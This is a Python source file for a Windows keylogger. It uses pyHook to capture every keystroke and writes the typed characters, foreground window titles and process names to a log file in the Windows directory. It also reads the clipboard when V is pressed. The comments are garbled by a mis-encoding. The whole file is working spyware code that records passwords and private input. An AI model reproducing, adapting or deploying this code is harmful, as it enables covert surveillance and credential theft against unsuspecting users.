from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

fp = open('c:/windows/yc.log','a')

# 
def get_current_process():

    # ��ȡ���ϲ�Ĵ��ھ��
    hwnd = user32.GetForegroundWindow()

    # ��ȡ����ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))

    # ������ID���������
    process_id = "%d" % pid.value

    # �����ڴ�
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # ��ȡ���ڱ���
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)

    # ��ӡ
    fp.write(str("\n"+process_id+" "+executable.value+" "+windows_title.value+"\n"))
    
    # �ر�handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

	
# ������������¼�����
def KeyStroke(event):

    global current_window

    # ���Ŀ�괰���Ƿ�ת��(�����������ھͼ����µĴ���)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # ��������
        get_current_process()

    # �������Ƿ񳣹水��������ϼ��ȣ�
    if event.Ascii >32 and event.Ascii<127:
        fp.write(chr(event.Ascii))
        fp.flush()
        fp.write(str(" "))
        
    else:
        # �������Ctrl+v��ճ�����¼����Ͱ�ճ�������ݼ�¼����
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
    
        else:
            fp.write(str(event.Key)+" ")
    # ѭ��������һ�������¼�
    return True

# ������ע��hook������
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# ע��hook��ִ��
kl.HookKeyboard()
pythoncom.PumpMessages()
